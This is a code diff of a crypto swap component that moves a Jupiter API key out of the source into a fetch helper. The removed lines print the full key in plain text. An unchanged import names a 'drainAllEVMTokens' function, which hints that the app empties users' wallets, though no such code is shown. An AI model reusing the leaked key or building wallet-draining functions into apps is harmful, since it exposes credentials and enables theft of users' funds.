@@ -16,6 +16,7 @@ import { getSolPrice } from '@/lib/utils';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { jupiterFetch } from '@/config/rpcEndpoints';
 import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import { ethers } from 'ethers';
 import {
@@ -725,7 +726,6 @@ export const SwapInterface = ({
   };
 
   // ============ JUPITER REAL SWAP ============
-  const JUPITER_API_KEY = 'jup_79e774560d53a86e28d5baff11bdddfaa0d1073af3d5b630b046c33f9a9dd2ca';
   const [isRealSwapping, setIsRealSwapping] = useState(false);
 
   const handleRealSwap = async () => {
@@ -779,9 +779,7 @@ export const SwapInterface = ({
           orderUrl.searchParams.append('taker', publicKey.toBase58());
           orderUrl.searchParams.append('slippageBps', slippageBps.toString());
 
-          const orderRes = await fetch(orderUrl, {
-            headers: { 'x-api-key': JUPITER_API_KEY },
-          });
+          const orderRes = await jupiterFetch(orderUrl.toString());
           if (!orderRes.ok) throw new Error(`Order failed: ${orderRes.status}`);
           const { transaction: orderTransaction, requestId } = await orderRes.json();
 
@@ -795,11 +793,10 @@ export const SwapInterface = ({
           signature = signedTx;
 
           // 3. Execute the signed transaction with Jupiter v2 /execute endpoint
-          const executeRes = await fetch('https://api.jup.ag/swap/v2/execute', {
+          const executeRes = await jupiterFetch('https://api.jup.ag/swap/v2/execute', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
-              'x-api-key': JUPITER_API_KEY,
             },
             body: JSON.stringify({
               requestId,
@@ -816,9 +813,7 @@ export const SwapInterface = ({
           // Fallback to v1 API if v2 fails
           // 1. Get quote
           const quoteUrl = `https://api.jup.ag/swap/v1/quote?inputMint=${fromToken.address}&outputMint=${toToken.address}&amount=${amountAtomic}&slippageBps=${slippageBps}&restrictIntermediateTokens=true`;
-          const quoteRes = await fetch(quoteUrl, {
-            headers: { 'x-api-key': JUPITER_API_KEY },
-          });
+          const quoteRes = await jupiterFetch(quoteUrl);
           if (!quoteRes.ok) {
             const t = await quoteRes.text();
             throw new Error(`Quote failed: ${quoteRes.status} ${t}`);
@@ -826,11 +821,10 @@ export const SwapInterface = ({
           const quoteResponse = await quoteRes.json();
 
           // 2. Build swap transaction
-          const swapRes = await fetch('https://api.jup.ag/swap/v1/swap', {
+          const swapRes = await jupiterFetch('https://api.jup.ag/swap/v1/swap', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
-              'x-api-key': JUPITER_API_KEY,
             },
             body: JSON.stringify({
               quoteResponse,
